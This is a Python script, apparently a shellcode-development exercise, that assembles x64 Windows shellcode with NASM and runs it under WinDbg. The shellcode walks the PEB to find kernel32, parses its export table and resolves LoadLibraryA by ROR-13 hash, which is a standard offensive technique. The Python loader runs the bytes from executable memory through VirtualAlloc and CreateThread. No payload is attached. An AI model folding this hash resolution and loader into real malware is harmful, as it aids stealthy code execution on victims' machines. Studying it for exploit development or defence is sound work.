import subprocess
import ctypes
import os
import tempfile

def assemble_shellcode():
    asm_code = """
bits 64
_start:
    
    mov rax, qword [gs:0x60]            ; 0x060 ProcessEnvironmentBlock to RAX.
    mov rax, [rax + 0x18]               ; 0x18  ProcessEnvironmentBlock.Ldr Offset
    mov rax, [rax + 0x10]               ; 0x10 Offset = ProcessEnvironmentBlock.Ldr.InLoadOrderModuleList.Flink
    mov rax, [rax]                      ; 0x0 offset takes us to the next item in the flink (ntdll.dll)                    
    mov rax, [rax]                      ; then to kernel32.dll
    mov rax, [rax + 0x30]               ; RAX = Kernel32 base address (Refer to _LDR_DATA_TABLE_ENTRY struct)
    mov r15, rax
    
    ; Now we crawl the PE and find the export address table

    mov ecx, [rax+0x3c]                 ; ECX = e_lfanew
    lea rcx, [rax + rcx]                ; RCX = &IMAGE_NT_HEADERS
    mov edx, [rcx + 0x88]               ; Jump to IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress, EDX = RVA (IMAGE_EXPORT_DIRECTORY)
    add rdx, rax                        ; Add kernelbase to get VA (IMAGE_EXPORT_DIRECTORY)

    
    mov   r10d, [rdx + 0x18]            ; DWORD NumberOfNames
    mov   r11d, [rdx + 0x20]            ; DWORD AddressOfNames (RVA)
    mov   r12d, [rdx + 0x24]            ; DWORD AddressOfNameOrdinals (RVA)
    mov   r13d, [rdx + 0x1C]            ; DWORD AddressOfFunctions (RVA)

    add r11, rax                        ; VA of name-pointer array
    add r12, rax                        ; VA of ordinal array
    add r13, rax                        ; VA of funciton-pointer array
    


; ------------------------------------------------------------------------------------------
; 1. Loop over the NumberOfNames entries (rdi will be our index)
; 2. For each index, load the string RVA, then compute the hash
; 3. Compare the hash to our pre-computed one from metasploit (ror13)
; 4. If it matches, grab the corresponding ordinal, lookup the function RVA (then add base for VA)

; 1. Setup loop

    xor rdi, rdi                        ; loop_counter = 0

find_loop:
    cmp rdi, r10                        ; If our counter is equal to r10d (number of names)
    jae not_found                       ; Then we bail out because we didnt find the function (can delete this after we get it working)

; 2. Load the name pointer (RVA), then get VA
    mov esi, [r11 + rdi*4]              ; AddressOfNames[loop_counter] <-- This is the RVA of whatever index we are on
    add rsi, r15                        ; VA of the index we are on
    mov rdx, rsi


; 3. Now we hash the null-terminated string with ROR-13

    xor ecx, ecx                        ; ECX = 0 (hash accumulator)

hash_loop:
    movzx ebx, byte [rsi]
    test bl, bl
    jz hash_done
    ror ecx, 13
    add ecx, ebx
    inc rsi
    jmp hash_loop

hash_done:
    cmp ecx, 0xec0e4e8e     
    jne next_name                       ; If it isnt equal, then we jump to this, which incriments our loop counter and loops over again

    ;---------------------------------------------------------------------------------------------------

    movzx ecx, word [r12 + rdi*2]       ; If not, we get the ordianal RVA/VA
    mov eax, [r13 + rcx*4]
    lea rbx, [r15 + rax]
    jmp found

next_name: 
    inc rdi
    jmp find_loop                       ; Thats process over again

not_found:
    xor r15, r15                        ; for debugging clearly, if it went wrong then r15 will be 0
    int3                                ; no bueno


found: 
    int3
    """

    # Create a temporary directory for the assembly and binary files
    temp_dir = tempfile.gettempdir()
    asm_path = os.path.join(temp_dir, "shellcode.asm")
    bin_path = os.path.join(temp_dir, "shellcode.bin")

    # Write the NASM assembly to a file
    with open(asm_path, "w") as f:
        f.write(asm_code)

    # Assemble the shellcode with NASM
    subprocess.run(["nasm", "-f", "bin", asm_path, "-o", bin_path], check=True)

    # Read the resulting raw shellcode bytes
    with open(bin_path, "rb") as f:
        shellcode = bytearray(f.read())

    print("[+] Shellcode bytes:", ''.join(f"\\x{b:02x}" for b in shellcode))
    print("[+] Shellcode length:", len(shellcode))
    return shellcode

def run_shellcode(shellcode):
    print("Attaching debugger to PID", os.getpid())
    subprocess.Popen(["WinDbgX", "/g", "/p", str(os.getpid())], shell=True)
    input("Press ENTER to run shellcode...")

    # Setup argument types
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    ctypes.windll.kernel32.CreateThread.argtypes = (
        ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
        ctypes.POINTER(ctypes.c_int))

    # Allocate memory and copy shellcode
    space = ctypes.windll.kernel32.VirtualAlloc(
        0, len(shellcode), 0x3000, 0x40)
    buff = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_void_p(space), buff, len(shellcode))

    # Execute shellcode in a new thread
    handle = ctypes.windll.kernel32.CreateThread(
        0, 0, ctypes.c_void_p(space), 0, 0, ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

def main():
    shellcode = assemble_shellcode()
    run_shellcode(shellcode)

if __name__ == "__main__":
    main()
